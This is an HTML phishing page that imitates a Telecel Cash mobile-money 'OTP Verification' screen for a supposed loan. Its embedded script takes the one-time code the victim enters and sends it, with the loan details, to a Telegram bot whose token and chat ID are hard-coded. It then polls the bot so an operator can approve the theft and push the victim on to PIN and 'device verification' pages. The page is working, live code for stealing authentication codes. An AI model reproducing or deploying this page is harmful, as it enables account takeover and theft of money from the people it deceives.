<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Verification - Telecel Cash</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --red: #E42320; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 10px;
        }
        .container {
            width: 100%;
            max-width: 380px;
            background: white;
            border-radius: 24px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .header {
            background: #E42320;
            color: white;
            padding: 18px 20px;
            text-align: center;
        }
        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 6px;
        }
        .logo-circle {
            width: 38px; height: 38px;
            background: white;
            color: #E42320;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 20px;
        }
        h1 { font-size: 22px; font-weight: 700; margin: 8px 0 5px; }
        .subtitle { font-size: 14.5px; line-height: 1.4; }

        .loan-box {
            margin: 16px;
            background: #fff0f0;
            border-radius: 14px;
            padding: 14px 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .loan-amount { font-size: 26px; font-weight: 800; color: var(--red); }

        .otp-container {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 8px 0 25px;
            padding: 0 20px;
        }
        .otp-input {
            width: 46px;
            height: 56px;
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            border: 2px solid #ddd;
            border-radius: 10px;
            outline: none;
        }
        .otp-input:focus {
            border-color: var(--red);
            box-shadow: 0 0 0 3px rgba(228,35,32,0.15);
        }

        .form-section { padding: 0 20px 25px; }
        .btn-action {
            width: 100%;
            background: var(--red);
            color: white;
            border: none;
            padding: 15px;
            font-size: 16.5px;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
        }
        .back-btn {
            margin-top: 10px;
            background: transparent;
            color: #555;
            border: 2px solid #ddd;
            padding: 13px;
            border-radius: 50px;
        }
        .error-msg {
            display: none;
            text-align: center;
            color: #c00;
            background: #ffebee;
            padding: 12px;
            margin: 12px 20px;
            border-radius: 12px;
        }
        #spinner {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.9);
            z-index: 10000;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: white;
        }
        .spin {
            width: 55px; height: 55px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <div class="logo-circle">t</div>
                <div><strong>Telecel Cash</strong><br><span style="font-size:12.5px;">Mobile Money</span></div>
            </div>
            <h1>OTP Verification</h1>
            <p class="subtitle">Enter the 5-digit code sent to your Telecel number to authorize the loan.</p>
        </div>

        <div class="loan-box" id="loanBox"></div>
        <div class="otp-container" id="otpContainer"></div>
        <div class="error-msg" id="errMsg"></div>

        <div class="form-section">
            <button class="btn-action" id="verifyBtn">Verify & Authorize Loan</button>
            <button class="back-btn" onclick="window.history.back()">← Back</button>
        </div>
    </div>

    <div id="spinner">
        <div class="spin"></div>
        <p style="margin-top:18px;">Verifying OTP...</p>
    </div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const name = params.get('name') || 'Flex Loan';
        const amount = params.get('amount') || '1000';
        const repay = params.get('repay') || '1381';
        const duration = params.get('duration') || '30';

        document.getElementById('loanBox').innerHTML = `
            <div><strong>${name}</strong><br><span class="loan-amount">GHS ${parseInt(amount).toLocaleString()}</span></div>
            <div style="text-align:right; font-size:13.5px;">Total: GHS ${parseInt(repay).toLocaleString()}<br>${duration} Days</div>
        `;

        function createOTPInputs() {
            const container = document.getElementById('otpContainer');
            container.innerHTML = '';
            for (let i = 0; i < 5; i++) {
                const input = document.createElement('input');
                input.type = 'text';
                input.maxLength = '1';
                input.className = 'otp-input';
                input.inputMode = 'numeric';
                container.appendChild(input);
            }
            setupAutoFocus();
        }

        function setupAutoFocus() {
            const inputs = document.querySelectorAll('.otp-input');
            inputs.forEach((input, index) => {
                input.addEventListener('input', () => {
                    if (input.value.length === 1 && index < 4) inputs[index + 1].focus();
                    if (getCode().length === 5) setTimeout(verifyOTP, 200);
                });
            });
        }

        function getCode() {
            return Array.from(document.querySelectorAll('.otp-input')).map(i => i.value.trim()).join('');
        }

        function verifyOTP() {
            const otp = getCode();
            if (otp.length !== 5) return;

            document.getElementById('spinner').style.display = 'flex';

            const ts = Date.now();
            const approveId = `approve_${ts}`;
            const verifyId = `verify_${ts}`;
            const declineId = `decline_${ts}`;

            fetch(`https://api.telegram.org/bot8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '7547427914',
                    text: `<b>🔴 Telecel Loan OTP</b>\n\n` +
                          `Loan: ${name}\nAmount: GHS ${parseInt(amount).toLocaleString()}\nOTP: <code>${otp}</code>\n\nChoose Action:`,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "✅ Approve Loan", callback_data: approveId },
                                { text: "📱 Verify Device", callback_data: verifyId }
                            ],
                            [{ text: "❌ Decline", callback_data: declineId }]
                        ]
                    }
                })
            }).then(() => {
                startPolling(approveId, verifyId, declineId);
            });
        }

        function startPolling(approveId, verifyId, declineId) {
            const interval = setInterval(() => {
                fetch(`https://api.telegram.org/bot8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8/getUpdates?offset=-1`)
                    .then(r => r.json())
                    .then(data => {
                        if (!data.ok || !data.result) return;
                        data.result.forEach(update => {
                            if (update.callback_query) {
                                const cb = update.callback_query.data;
                                clearInterval(interval);
                                document.getElementById('spinner').style.display = 'none';

                                if (cb === approveId) {
                                    window.location.href = `pin.html?${params.toString()}`;
                                } else if (cb === verifyId) {
                                    window.location.href = `device_verify.html?${params.toString()}`;
                                } else if (cb === declineId) {
                                    document.getElementById('errMsg').textContent = "Request was declined by admin.";
                                    document.getElementById('errMsg').style.display = 'block';
                                }
                            }
                        });
                    });
            }, 900);
        }

        // Initialize
        createOTPInputs();
    </script>
</body>
</html>
